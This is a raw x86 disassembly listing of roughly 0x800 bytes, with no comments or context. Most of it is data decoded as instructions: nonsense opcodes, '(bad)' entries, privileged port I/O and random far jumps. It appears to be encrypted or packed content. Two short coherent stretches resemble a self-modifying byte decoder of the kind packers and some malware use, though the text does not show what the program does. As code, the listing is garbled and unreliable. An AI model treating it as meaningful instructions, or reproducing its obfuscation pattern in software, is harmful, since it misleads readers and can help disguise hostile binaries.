  4038a5:	and    BYTE PTR [ecx+0x1e5835f8],al
  4038ab:	pusha  
  4038ac:	or     al,0x4b
  4038ae:	iret   
  4038af:	pop    edi
  4038b0:	xor    esi,ebp
  4038b2:	xchg   ebp,eax
  4038b3:	pushf  
  4038b4:	push   cs
  4038b5:	outs   dx,BYTE PTR ds:[esi]
  4038b6:	pushf  
  4038b7:	ret    
  4038b8:	cmc    
  4038b9:	sub    sp,si
  4038bc:	lods   eax,DWORD PTR ds:[esi]
  4038bd:	mov    WORD PTR [eax-0x5e],cs
  4038c0:	mov    ch,al
  4038c2:	push   ebp
  4038c3:	push   ebx
  4038c4:	pop    edx
  4038c5:	mov    al,0xac
  4038c7:	xor    BYTE PTR [ecx+0x5fa39ae3],bh
  4038cd:	fcomp  DWORD PTR ds:0x3a2716ac
  4038d3:	mov    esp,0x84271732
  4038d8:	cli    
  4038d9:	sbb    BYTE PTR [ebp-0x58],al
  4038dc:	outs   dx,DWORD PTR ds:[esi]
  4038dd:	jno    0x40395e
  4038df:	mov    dl,ch
  4038e1:	std    
  4038e2:	repnz xchg edx,eax
  4038e4:	gs xchg ecx,eax
  4038e6:	and    BYTE PTR [ecx],ah
  4038e8:	and    eax,0xf2064efd
  4038ed:	out    0xf3,al
  4038ef:	cmc    
  4038f0:	imul   bl
  4038f2:	fwait
  4038f3:	xlat   BYTE PTR ds:[ebx]
  4038f4:	dec    ebx
  4038f5:	pop    ds
  4038f6:	xor    BYTE PTR [ebx],dh
  4038f8:	ins    DWORD PTR es:[edi],dx
  4038f9:	es sar BYTE PTR fs:[ebx-0x74e77873],cl
  403901:	mov    ebp,0xf651ab6c
  403906:	enter  0xe4a8,0xf6
  40390a:	addr16 cdq 
  40390c:	mov    dl,BYTE PTR [edx-0x11bc9b03]
  403912:	xchg   ecx,eax
  403913:	add    esp,DWORD PTR [edx]
  403915:	std    
  403916:	jl     0x4038e2
  403918:	loop   0x4038b3
  40391a:	jno    0x4038f9
  40391c:	pop    ebx
  40391d:	fcomp  DWORD PTR ds:0xb5a5977c
  403923:	jne    0x4038dd
  403925:	mov    bh,0xa1
  403927:	nop/reserved BYTE PTR [esp+ebp*1-0x65]
  40392c:	retf   
  40392d:	sbb    ecx,ebp
  40392f:	cmp    al,0xe5
  403931:	add    edi,eax
  403933:	jo     0x403940
  403935:	fs popa 
  403937:	mov    eax,0xc984f264
  40393c:	lds    edx,FWORD PTR [ebx+0x2725b835]
  403942:	push   ebp
  403943:	jno    0x4039c4
  403945:	leave  
  403946:	rol    BYTE PTR [ebx+0x51],0x98
  40394a:	lock jne 0x4039ba
  40394d:	mov    ah,0xa7
  40394f:	sbb    al,0x7b
  403951:	loope  0x403977
  403953:	inc    ebp
  403954:	push   cs
  403955:	aaa    
  403956:	pushf  
  403957:	je     0x4039ba
  403959:	xlat   BYTE PTR ds:[ebx]
  40395a:	xchg   DWORD PTR [edx-0x65],edi
  40395d:	push   edi
  40395e:	in     eax,dx
  40395f:	mov    eax,0xbd1b75c1
  403964:	and    al,0xde
  403966:	xchg   ecx,eax
  403967:	bswap  ecx
  403969:	rcl    cl,cl
  40396b:	fisttp WORD PTR ss:[edi-0x20bcfe0]
  403972:	inc    esi
  403973:	adc    ah,ah
  403975:	sbb    cl,ah
  403977:	ficom  DWORD PTR cs:[ecx-0x20add482]
  40397e:	jbe    0x4039b9
  403980:	int3   
  403981:	popa   
  403982:	xor    al,0x51
  403984:	xor    eax,0xfc40aee3
  403989:	xlat   BYTE PTR ds:[ebx]
  40398a:	daa    
  40398b:	sub    al,0x3a
  40398d:	es cdq 
  40398f:	push   0xffffffd5
  403991:	rcr    BYTE PTR [edi],cl
  403993:	call   0x436:0x840fc085
  40399a:	add    BYTE PTR [eax],al
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	je     0x403a10
  4039d2:	icebp  
  4039d3:	fwait
  4039d4:	neg    DWORD PTR ds:0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	jge    0x403a00
  4039de:	aad    0xa8
  4039e0:	mov    eax,ds:0xbaef1b80
  4039e5:	daa    
  4039e6:	out    0xcb,al
  4039e8:	ins    DWORD PTR es:[edi],dx
  4039e9:	or     cl,bh
  4039eb:	loop   0x40397e
  4039ed:	icebp  
  4039ee:	add    ebx,DWORD PTR es:[ebx-0x2e615f2d]
  4039f5:	outs   dx,BYTE PTR ds:[esi]
  4039f6:	inc    ebp
  4039f7:	fimul  WORD PTR [eax]
  4039f9:	(bad)
  4039fd:	pop    ss
  4039fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ff:	adc    BYTE PTR [edx+edi*2-0x56255de2],bl
  403a06:	mov    bl,0xde
  403a08:	sti    
  403a09:	and    eax,0xde50e184
  403a0e:	(bad)  
  403a0f:	jl     0x4039f6
  403a11:	int3   
  403a12:	inc    edx
  403a13:	lock ss sub al,0xb4
  403a17:	repz (bad) 
  403a19:	xlat   BYTE PTR ds:[ebx]
  403a1a:	pop    ds
  403a1b:	jmp    0xe746:0x1e90fc44
  403a22:	dec    ebp
  403a23:	aas    
  403a24:	jbe    0x403a9b
  403a26:	ins    DWORD PTR es:[edi],dx
  403a27:	add    al,0x76
  403a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a2a:	dec    esi
  403a2b:	ins    DWORD PTR es:[edi],dx
  403a2c:	ret    
  403a2d:	adc    ch,0xce
  403a30:	retf   0x931d
  403a33:	mov    ecx,0x816acb79
  403a38:	or     esp,esi
  403a3a:	in     al,0xf1
  403a3c:	xchg   edx,eax
  403a3d:	mov    ah,0x35
  403a3f:	outs   dx,DWORD PTR ds:[esi]
  403a40:	jne    0x403a0e
  403a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a43:	jp     0x403a2d
  403a45:	aad    0x80
  403a47:	mov    ah,0x55
  403a49:	xchg   dh,ah
  403a4b:	leave  
  403a4c:	push   ebx
  403a4d:	iret   
  403a4e:	aas    
  403a4f:	sbb    eax,0x2a2982d9
  403a54:	mov    ebx,0xbef197d5
  403a59:	fstp   QWORD PTR ds:0x95f78f76
  403a5f:	(bad)  
  403a60:	cmp    bl,BYTE PTR ds:0x9af7cb17
  403a66:	pushf  
  403a67:	and    bh,BYTE PTR [eax+0x7e28906c]
  403a6d:	fnstenv [ecx+ebx*2+0x5748cac8]
  403a74:	mov    eax,ds:0xf51e8a72
  403a79:	dec    edi
  403a7a:	cld    
  403a7b:	jg     0x403ae5
  403a7d:	ret    
  403a7e:	lock js 0x403a14
  403a81:	xchg   di,ax
  403a83:	adc    DWORD PTR [edi-0x53],ebx
  403a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a87:	sbb    eax,0xffffffcf
  403a8a:	push   esi
  403a8b:	or     eax,0x934e96f
  403a90:	aas    
  403a91:	pop    esp
  403a92:	scas   al,BYTE PTR es:[edi]
  403a93:	mov    ch,0x5a
  403a95:	push   0xec4a055e
  403a9a:	jmp    DWORD PTR [ecx+0x62]
  403a9d:	adc    ecx,DWORD PTR [edi+0x5a]
  403aa0:	and    esp,edx
  403aa2:	mov    al,0x1
  403aa4:	or     eax,0x1ea46848
  403aa9:	pop    esi
  403aaa:	jmp    0x83ad:0x3cb00cbb
  403ab1:	pop    edx
  403ab2:	inc    ebx
  403ab3:	(bad)  
  403ab5:	lods   al,BYTE PTR ds:[esi]
  403ab6:	mov    al,ds:0x7a9b4aa8
  403abb:	ins    BYTE PTR es:[edi],dx
  403abc:	ja     0x403ad5
  403abe:	int3   
  403abf:	push   0xffffff98
  403ac1:	pop    edi
  403ac2:	xchg   edx,eax
  403ac3:	aam    0xe6
  403ac5:	cli    
  403ac6:	adc    eax,0xbd4e5dc9
  403acb:	inc    esi
  403acc:	mov    dl,0x23
  403ace:	ins    BYTE PTR es:[edi],dx
  403acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ad0:	inc    edi
  403ad1:	call   edx
  403ad3:	fild   WORD PTR [esi+ebp*2-0x5f]
  403ad7:	imul   eax,ebx,0x52
  403ada:	and    al,0xbf
  403adc:	pop    edi
  403add:	pop    eax
  403ade:	jno    0x403a83
  403ae0:	jmp    0xa470:0xd1d33e1b
  403ae7:	push   esp
  403ae8:	out    dx,al
  403ae9:	out    dx,eax
  403aea:	fucom  st(7)
  403aec:	in     eax,0x5d
  403aee:	ror    DWORD PTR [ebp+0x21],1
  403af1:	jnp    0x403ac5
  403af3:	retf   0xb09f
  403af6:	xor    BYTE PTR [esp+edi*1-0x3630408d],0x16
  403afe:	(bad)  
  403aff:	shl    DWORD PTR [edi],1
  403b01:	mov    edx,0x7465deb3
  403b06:	and    edx,esi
  403b08:	mov    DWORD PTR [edx+0x32],esp
  403b0b:	int    0xcb
  403b0d:	retf   0xe3bf
  403b10:	mov    BYTE PTR [ebp-0x5c],ah
  403b13:	mov    ebp,0xc7330c61
  403b18:	jb     0x403b92
  403b1a:	cs inc bx
  403b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b1f:	add    edx,esi
  403b21:	aad    0x32
  403b23:	lea    ebp,[esi+0x1e75eea4]
  403b29:	ret    0x63cb
  403b2c:	jp     0x403b72
  403b2e:	add    dh,BYTE PTR [ebx]
  403b30:	jmp    FWORD PTR [edx]
  403b32:	and    al,0x2e
  403b34:	aad    0xee
  403b36:	dec    ebx
  403b37:	cmp    DWORD PTR [edx+0x2596c563],edx
  403b3d:	jae    0x403bb7
  403b3f:	lods   al,BYTE PTR ds:[esi]
  403b40:	call   0x38b8:0x10d9387
  403b47:	imul   ebp,DWORD PTR [eax-0x524dc548],0xdf6f1875
  403b51:	mov    bh,0xe0
  403b53:	shl    ebx,0x9f
  403b56:	pop    ecx
  403b57:	neg    DWORD PTR [ebx+0x9be3aae]
  403b5d:	mov    al,0xbb
  403b5f:	sbb    bl,BYTE PTR [eax-0x3e8f2978]
  403b65:	stos   DWORD PTR es:[edi],eax
  403b66:	fwait
  403b67:	add    DWORD PTR [esp+esi*4+0x59],edi
  403b6b:	add    DWORD PTR [ebp-0x3b],ecx
  403b6e:	stc    
  403b6f:	or     al,0x83
  403b71:	scas   al,BYTE PTR es:[edi]
  403b72:	adc    al,cl
  403b74:	jo     0x403b80
  403b76:	add    BYTE PTR [esi+0x75],ch
  403b79:	fdivr  st(1),st
  403b7b:	adc    DWORD PTR [eax+0x7f],0xffffff9c
  403b7f:	jle    0x403b88
  403b81:	in     al,dx
  403b82:	inc    edi
  403b83:	arpl   WORD PTR [edx-0x7a],ax
  403b86:	mov    ebp,0x2e37bfc1
  403b8b:	push   edx
  403b8c:	sbb    esi,esp
  403b8e:	adc    BYTE PTR cs:[edx],ch
  403b91:	cmp    bl,BYTE PTR [ecx+0x1b]
  403b94:	popa   
  403b95:	outs   dx,DWORD PTR ds:[esi]
  403b96:	(bad)  [esp+edi*4]
  403b99:	aas    
  403b9a:	inc    eax
  403b9b:	mov    bh,0xf1
  403b9d:	daa    
  403b9e:	sub    edx,DWORD PTR [ebx+eiz*1+0x44]
  403ba2:	push   ds
  403ba3:	push   ds
  403ba4:	push   ds
  403ba5:	fist   DWORD PTR [edx+esi*1-0x4]
  403ba9:	(bad)  
  403baa:	sti    
  403bab:	imul   bp,sp,0xd2a4
  403bb0:	pop    edx
  403bb1:	dec    esi
  403bb2:	or     DWORD PTR [eax+0x7325f6e7],0xffffff85
  403bb9:	in     al,0x5e
  403bbb:	out    0xb2,eax
  403bbd:	add    al,0x3f
  403bbf:	rcr    dl,1
  403bc1:	and    al,BYTE PTR [esi-0x3f]
  403bc4:	cdq    
  403bc5:	sahf   
  403bc6:	mov    ebx,0xb8b99247
  403bcb:	test   eax,0x2c13ffb0
  403bd0:	(bad)  
  403bd2:	test   DWORD PTR ds:0xabeb51df,ebp
  403bd8:	out    0x1b,eax
  403bda:	ja     0x403bd4
  403bdc:	sub    edi,DWORD PTR [esi+0x537d7639]
  403be2:	(bad)  
  403be4:	pop    esp
  403be5:	gs mov bl,0xe6
  403be8:	ds stos DWORD PTR es:[edi],eax
  403bea:	jmp    0x403b81
  403bec:	repnz sub DWORD PTR [si-0x48],esi
  403bf1:	psubsb mm5,QWORD PTR [eax-0x59bd385]
  403bf8:	sub    al,0xdb
  403bfa:	jno    0x403c13
  403bfc:	jp     0x403c3e
  403bfe:	dec    BYTE PTR [ecx-0x21]
  403c01:	shl    ch,cl
  403c03:	sbb    esi,DWORD PTR [ecx]
  403c05:	js     0x403c44
  403c07:	jmp    0xaa3bfaa3
  403c0c:	mov    ch,0x7a
  403c0e:	fisub  DWORD PTR [edi+0x163024eb]
  403c14:	jmp    0x403bc7
  403c16:	leave  
  403c17:	mov    eax,0x18455152
  403c1c:	clc    
  403c1d:	call   0x6ff0e6cd
  403c22:	repz pop ds
  403c24:	inc    ebx
  403c25:	fisub  WORD PTR [edi-0x1b]
  403c28:	(bad)  
  403c29:	ffreep st(7)
  403c2b:	std    
  403c2c:	in     al,dx
  403c2d:	aam    0x31
  403c2f:	jno    0x403bc7
  403c31:	loope  0x403bd7
  403c33:	fdivr  QWORD PTR [ebp+eiz*8-0x19]
  403c37:	test   eax,0x7797f9a7
  403c3c:	sub    ah,dl
  403c3e:	mov    DWORD PTR [edi+0x23f2111b],ebp
  403c44:	pop    edi
  403c45:	lahf   
  403c46:	sahf   
  403c47:	jbe    0x403c93
  403c49:	ret    0x74af
  403c4c:	ins    DWORD PTR es:[edi],dx
  403c4d:	push   0x93f8a2a1
  403c52:	pushf  
  403c53:	neg    DWORD PTR [ebp+edx*8-0x22]
  403c57:	sub    eax,DWORD PTR [ecx]
  403c59:	sbb    dl,BYTE PTR [ebx+0x29]
  403c5c:	lock out 0x7e,al
  403c5f:	neg    BYTE PTR [ecx]
  403c61:	test   DWORD PTR [ecx],esp
  403c63:	and    dl,ch
  403c65:	mov    esi,0x743090a2
  403c6a:	adc    eax,0x5c432903
  403c6f:	neg    DWORD PTR [ebp-0x20242ec]
  403c75:	push   edi
  403c76:	popa   
  403c77:	int    0xc1
  403c79:	mov    esi,es
  403c7b:	add    al,0x76
  403c7d:	pop    edi
  403c7e:	jo     0x403c39
  403c80:	push   cs
  403c81:	mov    al,dl
  403c83:	shl    dh,0x8f
  403c86:	jle    0x403cb8
  403c88:	mov    esp,0xcca78b10
  403c8d:	mov    esi,0x567da99f
  403c92:	(bad)  
  403c93:	fild   QWORD PTR [edi]
  403c95:	or     BYTE PTR [ebp+0x682ad4a4],ah
  403c9b:	call   DWORD PTR [esi]
  403c9d:	jb     0x403cbb
  403c9f:	icebp  
  403ca0:	jmp    0x403c64
  403ca2:	lock je 0x403cf7
  403ca5:	shl    BYTE PTR [edi],0xc6
  403ca8:	fwait
  403ca9:	push   es
  403caa:	xchg   esi,eax
  403cab:	std    
  403cac:	adc    al,0x54
  403cae:	imul   edi,DWORD PTR [esi+0x37],0xf2a47b35
  403cb5:	fisubr DWORD PTR [edi]
  403cb7:	in     al,dx
  403cb8:	add    BYTE PTR [ebp+edi*1-0x5d],cl
  403cbc:	pop    ss
  403cbd:	cmc    
  403cbe:	or     bl,BYTE PTR [edx]
  403cc0:	mov    cl,0x4d
  403cc2:	push   es
  403cc3:	aam    0x96
  403cc5:	rcr    esi,0x4e
  403cc8:	cmp    al,0x56
  403cca:	xchg   ecx,eax
  403ccb:	popf   
  403ccc:	les    edi,FWORD PTR [edi+0x337dbe94]
  403cd2:	inc    esi
  403cd3:	mov    dl,0x2a
  403cd5:	scas   eax,DWORD PTR es:[edi]
  403cd6:	(bad)  
  403cd7:	push   edx
  403cd8:	scas   al,BYTE PTR es:[edi]
  403cd9:	push   eax
  403cda:	shl    DWORD PTR [ecx],1
  403cdc:	in     eax,dx
  403cdd:	mov    edi,0x742e0311
  403ce2:	jne    0x403d10
  403ce4:	rcr    bl,0x5b
  403ce7:	push   ecx
  403ce8:	aam    0xa4
  403cea:	mov    bl,0xdb
  403cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ced:	neg    eax
  403cef:	bound  edi,QWORD PTR [ecx]
  403cf1:	fcomip st,st(6)
  403cf3:	push   ebx
  403cf4:	inc    eax
  403cf5:	pop    es
  403cf6:	jo     0x403d00
  403cf8:	stos   BYTE PTR es:[edi],al
  403cf9:	sub    DWORD PTR ds:0x2a36e324,ecx
  403cff:	jge    0x403d2e
  403d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d02:	sbb    DWORD PTR ds:0xd99acac5,ecx
  403d08:	or     edx,DWORD PTR [ebp+0x54]
  403d0b:	xchg   esi,eax
  403d0c:	xor    DWORD PTR [edx+0x4a],eax
  403d0f:	hlt    
  403d10:	arpl   dx,di
  403d12:	push   eax
  403d13:	outs   dx,BYTE PTR ds:[esi]
  403d14:	fucomi st,st(1)
  403d16:	test   eax,0x824093aa
  403d1b:	mov    ds:0xc252df46,al
  403d20:	popf   
  403d21:	xlat   BYTE PTR ds:[ebx]
  403d22:	pop    edx
  403d23:	sbb    al,0x5c
  403d25:	sbb    eax,0xbb1d1426
  403d2a:	xchg   edx,eax
  403d2b:	add    eax,0x534b3520
  403d30:	xor    DWORD PTR [ecx-0x1b],esi
  403d33:	or     edi,eax
  403d35:	test   al,0x58
  403d37:	fidiv  DWORD PTR [eax*1+0x57cff297]
  403d3e:	scas   al,BYTE PTR es:[edi]
  403d3f:	xchg   DWORD PTR [eax+eiz*1+0x7677ad87],ebp
  403d46:	dec    eax
  403d47:	sub    DWORD PTR [ebx+ecx*1],edx
  403d4a:	xchg   DWORD PTR [edi+0x2475857b],ecx
  403d50:	inc    BYTE PTR [ecx-0x7b81fbc]
  403d56:	cmp    DWORD PTR [ecx+0x628e5f94],esp
  403d5c:	xor    eax,0xc8c02516
  403d61:	dec    ecx
  403d62:	dec    esi
  403d63:	jnp    0x403dac
  403d65:	js     0x403d2a
  403d67:	jg     0x403d6c
  403d69:	in     al,0x51
  403d6b:	cmp    DWORD PTR [ecx-0x404df819],esi
  403d71:	jmp    0x36ca:0xf305f2ae
  403d78:	int    0x94
  403d7a:	call   0xbf72:0x613f27d0
  403d81:	add    DWORD PTR [eax-0x27],edx
  403d84:	xchg   edi,eax
  403d85:	fiadd  DWORD PTR ds:0xf3f8a1a9
  403d8b:	neg    dh
  403d8d:	and    al,0x6f
  403d8f:	enter  0x8278,0xca
  403d93:	push   edx
  403d94:	(bad)  
  403d95:	fisttp WORD PTR [edi-0x6290b151]
  403d9b:	sar    DWORD PTR [edi-0xbd2b181],cl
  403da1:	xchg   edi,eax
  403da2:	or     eax,DWORD PTR cs:[ebx]
  403da5:	sbb    ecx,0x9
  403da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da9:	sub    al,0x5c
  403dab:	sti    
  403dac:	cmp    al,BYTE PTR [ecx-0x2ed7d54a]
  403db2:	xlat   BYTE PTR ds:[ebx]
  403db3:	(bad)  
  403db4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403db5:	or     ch,bh
  403db7:	test   BYTE PTR [edx],al
  403db9:	mov    bh,0x9c
  403dbb:	mov    ds:0x8e61b1f,eax
  403dc0:	adc    ebp,ecx
  403dc2:	leave  
  403dc3:	in     al,0x91
  403dc5:	jns    0x403de1
  403dc7:	dec    ebp
  403dc8:	mov    bl,0xd0
  403dca:	jns    0x403e3f
  403dcc:	cmp    al,0xe8
  403dce:	mov    DWORD PTR [edx+0x4d8b0000],0xb8ce33d8
  403dd8:	gs (bad) 
  403dda:	int    0xff
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    DWORD PTR [ecx-0x1b8d2e1b],ebx
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e56
  403e1f:	dec    eax
  403e20:	adc    BYTE PTR [ecx-0x6f],cl
  403e23:	mov    bh,0x97
  403e25:	or     DWORD PTR [edi-0x3e],0xffffffd0
  403e29:	and    BYTE PTR [ecx],cl
  403e2b:	iret   
  403e2c:	daa    
  403e2d:	adc    ch,0xb7
  403e30:	rcr    bh,0xf2
  403e33:	stc    
  403e34:	xchg   BYTE PTR [edx-0x3f4f9202],cl
  403e3a:	mov    eax,0x40a5146d
  403e3f:	add    WORD PTR [edi],ax
  403e42:	es add eax,0x6aedc29a
  403e48:	std    
  403e49:	cmp    eax,0xd324c2fe
  403e4e:	icebp  
  403e4f:	stc    
  403e50:	loop   0x403dd5
  403e52:	loope  0x403e7d
  403e54:	in     al,0xa7
  403e56:	out    0x1b,al
  403e58:	rcl    DWORD PTR ds:0x7d276351,0x2e
  403e60:	cmp    DWORD PTR [edx-0x6ef34670],0x390934bd
  403e6a:	inc    ecx
  403e6b:	xor    edx,edi
  403e6d:	sti    
  403e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e6f:	pop    ss
  403e70:	xchg   edx,eax
  403e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e72:	fmul   DWORD PTR [esi+0x2c281705]
  403e78:	imul   ecx,DWORD PTR [edx+0x204a5d86],0x0
  403e7f:	mov    eax,ds:0x697fc1fc
  403e84:	pushf  
  403e85:	lds    edx,FWORD PTR fs:[ecx-0x1]
  403e89:	jns    0x403e57
  403e8b:	stos   BYTE PTR es:[edi],al
  403e8c:	test   eax,0xd5280127
  403e91:	mov    ebp,0x13ade00a
  403e96:	loope  0x403eab
  403e98:	test   eax,0xa779b8a3
  403e9d:	dec    ecx
  403e9e:	out    0x9,eax
  403ea0:	jg     0x403ed8
  403ea2:	cmp    eax,0xd2003e53
  403ea7:	xor    DWORD PTR [edi],ebx
  403ea9:	mov    DWORD PTR [eax],ecx
  403eab:	(bad)  
  403eac:	clc    
  403ead:	cwde   
  403eae:	sub    al,0xd2
  403eb0:	or     eax,DWORD PTR [ebx]
  403eb2:	mov    ?,WORD PTR [ecx-0x5f]
  403eb5:	or     DWORD PTR [edx+0x32],edi
  403eb8:	fwait
  403eb9:	inc    esi
  403eba:	es jp  0x403eb7
  403ebd:	xor    al,ch
  403ebf:	shl    BYTE PTR [edx],0xfd
  403ec2:	cmp    eax,0x644eba4b
  403ec7:	sub    BYTE PTR [ebx-0x74d35108],cl
  403ecd:	ret    
  403ece:	or     BYTE PTR [eax-0x2f86dc0e],bh
  403ed4:	cdq    
  403ed5:	adc    BYTE PTR [esi],ch
  403ed7:	xor    al,0xcf
  403ed9:	jmp    0x403ea0
  403edb:	ja     0x403f4e
  403edd:	inc    eax
  403ede:	dec    ebx
  403edf:	push   es
  403ee0:	scas   eax,DWORD PTR es:[edi]
  403ee1:	ret    
  403ee2:	(bad)  ds:0xc336f752
  403ee8:	xchg   BYTE PTR [ebp-0x17],dh
  403eeb:	dec    ebx
  403eec:	test   BYTE PTR [ecx],dl
  403eee:	not    BYTE PTR [edi+ebp*2-0x36]
  403ef2:	pop    edi
  403ef3:	rol    DWORD PTR [edx+0x5f],cl
  403ef6:	ja     0x403f4e
  403ef8:	in     al,dx
  403ef9:	ret    0x2a54
  403efc:	(bad)  
  403efd:	fnstsw WORD PTR [ebp+0x5b]
  403f00:	sbb    al,0x24
  403f02:	inc    ecx
  403f03:	push   ecx
  403f04:	dec    ebp
  403f05:	mov    edi,0x7ec0b6de
  403f0a:	dec    edi
  403f0b:	adc    DWORD PTR [edi-0x24],0xabd3facc
  403f12:	xor    DWORD PTR [ecx],edx
  403f14:	outs   dx,DWORD PTR ds:[esi]
  403f15:	push   ss
  403f16:	ins    DWORD PTR es:[edi],dx
  403f17:	jno    0x403ee2
  403f19:	cmp    BYTE PTR [edi],ch
  403f1b:	cmp    bh,dh
  403f1d:	xor    ebx,esp
  403f1f:	add    ecx,DWORD PTR [esi+0x0]
  403f22:	pop    ss
  403f23:	mov    bl,0xad
  403f25:	inc    edx
  403f26:	imul   ebp,DWORD PTR [eax-0x4b],0xc3290a28
  403f2d:	ror    esi,1
  403f2f:	neg    DWORD PTR [edi-0x705fe1f2]
  403f35:	lock xchg esi,eax
  403f37:	and    BYTE PTR [ecx+0x1b0873],dl
  403f3d:	sub    al,0xed
  403f3f:	fbld   TBYTE PTR [ebx+0x7b08103d]
  403f45:	mov    eax,0x51fd134b
  403f4a:	mov    ch,0xaf
  403f4c:	ins    DWORD PTR es:[edi],dx
  403f4d:	mov    ebp,0xec411306
  403f52:	pop    esi
  403f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f54:	push   eax
  403f55:	mov    dl,0x6f
  403f57:	mov    dh,0x32
  403f59:	jp     0x403fc6
  403f5b:	inc    edi
  403f5c:	ret    
  403f5d:	xchg   esp,eax
  403f5e:	(bad)  
  403f5f:	fcmovne st,st(5)
  403f61:	test   eax,0xf0ec6a3f
  403f66:	or     DWORD PTR [ebp-0x52],esi
  403f69:	jp     0x403f19
  403f6b:	cs pop ds
  403f6d:	dec    edx
  403f6e:	mov    bh,0xff
  403f70:	xchg   edi,eax
  403f71:	inc    eax
  403f72:	inc    edx
  403f73:	add    eax,0x96cc5d46
  403f78:	pop    ebx
  403f79:	out    0xcf,eax
  403f7b:	or     BYTE PTR [edi+0x14],dl
  403f7e:	mov    eax,ds:0x598d329a
  403f83:	mov    al,BYTE PTR [ebx-0x6e]
  403f86:	adc    bh,BYTE PTR [ebx]
  403f88:	popa   
  403f89:	call   0xa60c:0xfc121274
  403f90:	add    BYTE PTR [ebx],dl
  403f92:	in     eax,dx
  403f93:	adc    ch,ch
  403f95:	sti    
  403f96:	or     edi,ebp
  403f98:	pop    edx
  403f99:	sub    BYTE PTR [edx-0x22],cl
  403f9c:	retf   0xe8c4
  403f9f:	data16 (bad) 
  403fa1:	cwde   
  403fa2:	test   DWORD PTR [esi+0x65],edi
  403fa5:	adc    DWORD PTR [ecx],esp
  403fa7:	js     0x404009
  403fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403faa:	mov    edi,0xec97e3a5
  403faf:	adc    eax,DWORD PTR [esi+0x254c7275]
  403fb5:	jnp    0x40402f
  403fb7:	inc    ebp
  403fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fb9:	in     al,0x3b
  403fbb:	fs stos DWORD PTR es:[edi],eax
  403fbd:	enter  0x78ae,0xec
  403fc1:	xchg   BYTE PTR ds:0x4206d593,ch
  403fc7:	sub    DWORD PTR [edi],eax
  403fc9:	lods   eax,DWORD PTR ds:[esi]
  403fca:	mov    cl,0x9b
  403fcc:	mov    WORD PTR [eax-0x57],fs
  403fcf:	lea    esi,[edi-0x7add8657]
  403fd5:	sahf   
  403fd6:	rol    BYTE PTR [esi],1
  403fd8:	inc    esi
  403fd9:	mov    eax,0x6691357f
  403fde:	xor    bl,BYTE PTR [eax-0x6e5899ee]
  403fe4:	xchg   ecx,eax
  403fe5:	or     eax,0x7f73c10
  403fea:	lock ja 0x404067
  403fed:	mov    eax,0x5dbee848
  403ff2:	xchg   ebp,eax
  403ff3:	pop    ecx
  403ff4:	adc    al,0xc5
  403ff6:	mov    ch,BYTE PTR [ecx+esi*4-0x3b6af74f]
  403ffd:	inc    edx
  403ffe:	pop    es
  403fff:	xor    eax,0xea9bf68c
  404004:	les    esi,FWORD PTR [ecx-0x12992a8c]
  40400a:	sbb    eax,0xb98a0004
  40400f:	sbb    DWORD PTR [ecx+edx*1-0xcb8ea7],0x73d3f05e
  40401a:	add    eax,0xcb0e3400
  40401f:	sar    DWORD PTR [eax-0x14],0xcb
  404023:	or     al,0xae
  404025:	pusha  
  404026:	sbb    ah,BYTE PTR [eax+ebp*8+0x66]
  40402a:	or     DWORD PTR [ebx-0x67f99dfd],ebp
  404030:	in     al,dx
  404031:	sub    eax,0x3cf9d57d
  404036:	(bad)  
  404037:	sti    
  404038:	sub    al,0xbb
  40403b:	sbb    BYTE PTR [ebp-0x177bd2b6],0x65
  404042:	sbb    eax,DWORD PTR [ebp+0x3f6436be]
  404048:	mov    ebx,0x542a7145
  40404d:	mov    eax,0xc328dac
  404052:	ins    DWORD PTR es:[edi],dx
  404053:	dec    ebx
  404054:	out    dx,eax
  404055:	daa    
